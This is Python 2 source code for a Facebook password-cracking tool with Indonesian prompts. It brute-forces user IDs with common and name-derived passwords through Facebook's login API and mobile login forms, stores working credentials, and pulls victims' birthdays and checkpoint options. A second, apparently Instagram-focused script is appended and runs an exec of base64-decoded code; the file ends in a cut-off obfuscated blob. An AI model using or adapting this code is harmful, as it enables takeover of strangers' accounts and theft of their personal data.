				xnxx = raw_input("%s [%s•%s] Contoh password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,b,p,p,b,p)).split(",")
				if len(xnxx) =="":
					exit("%s [%s!%s] Jangan kosong"%(p,m,p))
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(freefb, uid, xnxx)
			hasil()
		elif jeeck_X_nano_X_brutall == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Hasil [O] tersimpan  di : ok.txt\n %s[%s•%s] Hasil [C] tersimpan  di : cp.txt"%(p,b,p,p,b,p))
				print("%s [%s•%s] Aktifkan mode pesawat 5 detik jika tidak ada hasil"%(p,b,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						jeeck_X_nano = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						jeeck_X_nano = [ "sayang", "bissmilah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu" ]
					coeg.submit(mobile, uid, jeeck_X_nano)
			hasil()
		else:
			exit("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p))

	else:
		menu() 


def api(uid, jeeck_X_nano):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Cracking] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in jeeck_X_nano:
		pw = pw.lower()
		ses = requests.Session()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r \x1b[1;32m[O] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [C] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [C] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasic(uid, jeeck_X_nano):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Cracking] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in jeeck_X_nano:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		jeeckxnano = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[O] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [C] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [C] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mobile(uid, jeeck_X_nano):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r [Cracking] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in jeeck_X_nano:
		kwargs = {}
		pw = pw.lower()
		ses = requests.Session()
		ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
		p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
		b = parser(p,"html.parser")
		bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for i in b("input"):
			try:
				if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
				else:continue
			except:pass
		kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		jeeckxnano = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
		if "c_user" in ses.cookies.get_dict().keys():
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
			print("\r \x1b[1;32m[O] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("ok.txt","a").write("%s|%s\n"%(uid, pw))
			break
		elif "checkpoint" in ses.cookies.get_dict().keys():
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [C] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("cp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s|%s|%s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [C] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s|%s"%(uid, pw))
			open("cp.txt","a").write("%s|%s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s|%s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def hasil():
	if len(ok) != 0 or len(cp) != 0:
		jeeckgantenkxxbrutallxxzzzzzzzzz___()
	else:
		exit("\n%s [%s•%s] Deteksi 0 Goblok :V\n%s [%s!%s] Mungkin Lu Belum Crack Cook"%(p,b,p,p,m,p))

def jeeckgantenkxxbrutallxxzzzzzzzzz___():
    global token
    ___jeeck___x___nanoganz___ = raw_input("\n %s[%s•%s] Check Option Account Sesi? y/n\n%s [%s•%s] Choose: "%(p,b,p,p,b,p))
    if ___jeeck___x___nanoganz___ in ["y","Y"]:
#        ___jeeck___opsi___chek___()
        ___jeeck___opsi___chek___()
    elif ___jeeck___x___nanoganz___ in ["n","N"]:
#        os.remove('checkcp.txt')
        menu()
    else: 
        exit("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p))




def ___jeeck___opsi___chek___():
	files = ("checkcp.txt")
	try:
		jeeck_opsi = open(files, "r").readlines()
	except IOError:
		exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(p,m,p,h,files,p))
	for jeeckgantenk in jeeck_opsi:
		jeeckxnank = jeeckgantenk.replace("\n","")
		jecko  = jeeckxnank.split(" • ")
		print("\n\033[0;96m\033[0;97m [\033[0;36m•\033[0;37m] Account : "+(jeeckxnank.replace(" + ","")))
		try:
			_jeeck_sclu_debeast_(jecko[0].replace(" + ",""), jecko[1])
		except requests.exceptions.ConnectionError:
			pass
	os.remove('checkcp.txt')
	exit("\n%s [%s!%s] Chek opsi selesai cook:V"%(p,m,p))

def _jeeck_sclu_debeast_(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/Berhasils/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print("\033[0;96m\033[0;97m [\033[0;36m•\033[0;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\033[0;96m\033[0;97m [\033[0;36m•\033[0;37m] Total Opsi   "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" [\033[0;36m"+str(opt+1)+"\033[0;37m] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(p,m,p,oh))
	else:
		print("%s[%s!%s]Eror Saat Login Cook Mungkin Dah Di Ganti Password\n"%(p,m,p))


#+#+#+#+#+#+#+#+#+#+#+#+#+##++##+#+#+#+#+#+#+#+#+#++#+#

def ___jeeck___opsinetiliki___():
	files = raw_input("\n %s[%s•%s] Masukan file \n %s[%s•%s] Files: "%(p,b,p,p,b,p))
	try:
		jeeck_opsi = open(files, "r").readlines()
	except IOError:
		exit("\n%s [%s!%s] Files %s%s%s Tidak Ada!"%(p,m,p,h,files,p))
	for jeeckgantenk in jeeck_opsi:
		jeeckxnank = jeeckgantenk.replace("\n","")
		jecko  = jeeckxnank.split("|")
		print("\n\033[0;96m\033[0;97m [\033[0;36m•\033[0;37m] Account : "+(jeeckxnank.replace(" + ","")))
		try:
			___jeeck___results___chek___cook___(jecko[0].replace(" + ",""), jecko[1])
		except requests.exceptions.ConnectionError:
			pass
	os.remove('cp.txt')
	exit("\n%s [%s!%s] Chek opsi selesai cook:V"%(p,m,p))

def ___jeeck___results___chek___cook___(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	ses = requests.Session()
	# kntl bapackkau pecah
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/Berhasils/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		print("\033[0;96m\033[0;97m [\033[0;36m•\033[0;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\033[0;96m\033[0;97m [\033[0;36m•\033[0;37m] Total Opsi   "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" [\033[0;36m"+str(opt+1)+"\033[0;37m] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(p,m,p,oh))
	else:
		print("%s[%s!%s]Eror Saat Login Cook Mungkin Dah Di Ganti Password\n"%(p,m,p))


#######################################################

def ___jeeck___tilikihasile___():
    global token
    cek_ok = open("ok.txt","r").read()
    cek_cp = open("cp.txt","r").read()
    print("\n %s[%s1%s] Cek ok hasil crack\n %s[%s2%s] Cek cp hasil crack\n %s[%s0%s] Back to menu"%(p,b,p,p,b,p,p,b,p))
    _xxcode_jeeckxnano_ = raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
    if _xxcode_jeeckxnano_ in ["1","01"]:
        if len(cek_ok) != 0:
            print("\n %s[%s ___jeeck___tilikihasile___ ok %s]%s\n"%(b,p,b,p));os.system("cat ok.txt")
        else:
            print("\n %s[%s!%s] ___jeeck___tilikihasile___ tidak ada!"%(p,m,p));os.sys.exit()
    elif _xxcode_jeeckxnano_ in ["2","02"]:
        if len(cek_cp) != 0:
            print("\n %s[%s ___jeeck___tilikihasile___ cp %s]%s\n"%(b,p,b,p));os.system("cat cp.txt")
        else:
            print("\n %s[%s!%s] ___jeeck___tilikihasile___ tidak ada!"%(p,m,p));os.sys.exit()
    elif _xxcode_jeeckxnano_ in ["0","00"]:
        menu()
    else: 
        exit("\n%s [%s!%s] Pilih dengan benar cook :V"%(p,m,p))

def Berhasil():
    global token
    print("\n%s [%s1%s] Berhasil user agent sendiri\n %s[%s2%s] Cek user agent sekarang"%(p,b,p,p,b,p))
    _jeeck_xnano_xxzy_ = raw_input("\n%s [%s•%s] Choose: "%(p,b,p))
    if _jeeck_xnano_xxzy_ in ["1","01"]:
        user_jeeckxnano = raw_input("\n%s [%s•%s] Masuk user agent mu\n %s[%s•%s] User agent: "%(p,b,p,p,b,p))
        print("%s [%s•%s] Please Wait!"%(p,b,p));time.sleep(1.5)
        open("ua","w").write(user_jeeckxnano)
        print("%s [%s•%s] Berhasil set user agent"%(p,b,p))
        raw_input("%s [Back]"%(p))
        menu()
    elif _jeeck_xnano_xxzy_ in ["2","02"]:
        try:
            ua = open("ua", "r").read()
        except IOError:
            ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
        print("%s [%s•%s] User agent sekrng: %s"%(p,b,p,ua))


def ___chek______jeeck___tilikihasile______jeeck___():
    try:
        open("ok.txt","r").read()
    except Exception as e:
        os.system("touch ok.txt")
    try:
        open("cp.txt","r").read()
    except Exception as e:
        os.system("touch cp.txt")


### ig


#!/usr/bin/python2
# coding=utf-8

Hj = '\x1b[0;92m' 
Mt = '\x1b[0m' 
ingfo = (
"""%s
########
##
#
#
##
#
#
#
#
#
#
#
#
#
#
#
#
%s"""%(Hj,Mt))
#
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')
try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')
    
import requests, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64, uuid
from concurrent.futures import ThreadPoolExecutor 
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
from calendar import monthrange
#os.system("clear")
#CorrectUsername = "FCX-SDX-JCK"
#CorrectPassword = "FCX-SDX-JCK"


#loop = 'true'
#while (loop == 'true'):
 #   username = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Password : ")
  #  if (username == CorrectUsername):
#    	password = raw_input("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Detected : ")
 #       if (password == CorrectPassword):
  #          print "Logged in successfully as " + username
   #         loop = 'false'
    #    else:
     #       print "Wrong Password"
#            os.system('xdg-open https://wa.me/+6281392505882')
      #      os.system('xdg-open https://wa.me/+6281392505882?text=Assalamualaikum++saya+ingin+beli+lisensi:+'+id+'>/dev/null')
#    else:
 #       print "Wrong Detected"
  #      os.system('xdg-open https://wa.me/+6281392505882')
#

time.sleep(5)
done = True
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

reload(sys)
sys.setdefaultencoding('utf-8')

I='\033[0;32m'
C='\033[0;36m'
M='\033[0;31m'
U='\033[0;35m'
K='\033[0;33m'
#P='\033[0;37m'
P='\033[00m'
H='\033[0;00m'
Q="\033[00m"
I='\033[0;32m'
B='\033[0;36m'
B='\033[0;31m'
U='\033[0;35m'
K='\033[0;33m'
M='\033[0;34m'
#P='\033[0;37m'
O='\033[0;33m'
H='\033[0;00m'
Q="\033[00m"
I='\033[0;32m'
C='\033[0;36m'
M='\033[0;31m'
U='\033[0;35m'
J='\033[0;33m'
#P='\033[0;37m'
h='\033[00m'
p='\033[0;00m'
Q="\033[00m"
I='\033[0;32m'
b='\033[0;36m'
m='\033[0;31m'
u='\033[0;35m'
k='\033[0;33m'
c='\033[0;34m'
#P='\033[0;37m'
O='\033[0;33m'
S='\033[0;00m'
Q="\033[00m"
acak = [M, H, K,S,J, B, U, O, P]
warna = random.choice(acak)
til ="[++]" 
ok, cp, id, user, mi, status_foll, poll, cr, looping, loop = [], [], [], [], [], [], [], [], 1, 0
platform1 = str(platform.platform()).lower()
p1 = base64.b64encode(platform1)

url_instagram = "https://www.instagram.com/"
user_agentz = "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
user_agentz_api = "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"
user_agentz_qu = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"]
headerz = {"User-Agent": user_agentz}
headerz_api = {"User-Agent": user_agentz_api}

def konfir():
	try:
		lis = open ("data/lisensi.txt","r").read()
	except IOError:
		os.system("clear")
		jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Lisendi Experiped");jeda(2)
		os.system("rm -rf data/lisensi.txt");konfirmasi()
	if os.path.exists('data/lisensi.txt'):
		konfirmasi1()
	else:
		konfirmasi()
def jeeck(keliling):
        for mau in keliling + '\n':
                sys.stdout.write(mau)
                sys.stdout.flush();jeda(0.01)
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        jeeck("\033[0;36m[\033[0;35m++\033[0;36m]\033[0;00m Deleted Doog"),
        sys.stdout.flush();jeda(1)
def clear():
	os.system("clear")
def folder():
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:
		ua_ = open('data/ua.txt', 'r').read()
	except KeyError,IOError:
		ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
		open("data/ua.txt","w").write(ua_)
	except:
		pass

IP = requests.get("https://api.ipify.org/").text
exec(base64.b64decode('YXV0aG9yID0iUm9taSBBZnJpemFsIgpmYl9tZSA9ImZhY2Vib29rLmNvbS9yb21pLmFmcml6YWwuMTAyIgpnaXRodWIgPSJnaXRodWIuY29tL01hcmstWnVjayI='))



#exec(marshal.loads(zlib.decompress(base64.b64decode("eJy1VuluGzcQntVlWz4S51LStAXTFIWLFJZkXbEb15EtxYdsuZCVxIkRBJSWldZ7KUsuUgPSr/Qdmn99xT5CZ2gpbRQfSItqRXJ2ZjgHOR+5bRj+JrE9xiZ/x04AHBtgApjYR8CMghmDThzeGfAyMpLGwUyAOQHmJJhTYCbBnIbOhNaJjnRmwJwFcw46Uc2PncOPj9sc8pG+Ar8BvEQvV+FgYZ4CzGBX44p7J5w1Ax66nNWEEm7IXnCvwzZ933R837aQrlisKQLL5fIGTtpBMffYATfZXuiEbB3f5Tco6LwVzPQ5szzGW2TjmJsW8wMiZWhLIeU6qm3jdMW0Avk/7R4fZTOZTG6pUCrllou55cLKK1azUNAUivdYlwehZC0RHIcjb2fN+Jl7IWbEaiGriK58gGoVy+QOdxe3uLLskG3pfCsWZ+uhjZonFIbDMeSVZ/JL1N/EJBQPGeXImfR7wusIj/VE0LHkAilwTwlaoOG4LkJl9ULnzz/ev/9nk1+jcrlr89GfbQS+r1iFO8J1WdXjts6DHdYPN/YrVVaulHfLW6xZLe+xnWp1o8YOWb1c32fabbm++Uz45c5kO2qyOOW1usr2nu08lbe72y+06a1S12fXn5XpN3vkQuc1G4yhyR2/r89CSXdYZymh7hJJf0LRyvVmt19h6ub5ZbbK98sGLMivvYqxtqvhZbHFsG1RU96MAJw1Qo5J/F6F6fAcwAFBIRwkEfYAUluXAABWD4zj0DThOUKEOItCPEEbuDKKaiiMVg+feVxBTE2AnIXgDhmFgcW9uqUmya3gGHKopKvZUPwop5E8RlFL9mH5JwiAOahoGCVAzMJgANQuDSVBzMJgivA2SBDl0gqgbTBOiBjM60isErf40pBBeKYoYIZQaRm58hgKGgZhLXa44c5lCcqgQP1NhHvqJf